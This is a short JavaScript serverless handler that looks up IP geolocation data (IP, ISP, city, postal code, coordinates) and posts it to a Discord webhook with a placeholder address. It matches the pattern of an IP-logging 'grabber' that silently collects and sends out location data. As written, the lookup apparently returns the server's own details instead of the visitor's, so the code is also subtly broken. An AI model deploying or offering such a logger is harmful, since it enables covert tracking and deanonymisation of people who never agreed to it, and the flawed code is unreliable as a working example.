export default async function handler(req, res) {
  const ipapiRes = await fetch('https://ipapi.co/json/');
  const data = await ipapiRes.json();

  const formattedData = `**IP:** ${data.ip}
**Network:** ${data.network}
**Version:** ${data.version}
**ASN:** ${data.asn}
**ISP:** ${data.org}
**City:** ${data.city}
**Postal Code:** ${data.postal}
**Region:** ${data.region}
**Country:** ${data.country_name}
**Capital:** ${data.country_capital}
**Country Population:** ${data.country_population}
**Calling Code:** ${data.country_calling_code}
**Latitude:** ${data.latitude}
**Longitude:** ${data.longitude}
**Timezone:** ${data.timezone}
**Currency:** ${data.currency}`;

  await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: formattedData }),
  });

  res.status(204).end();
}
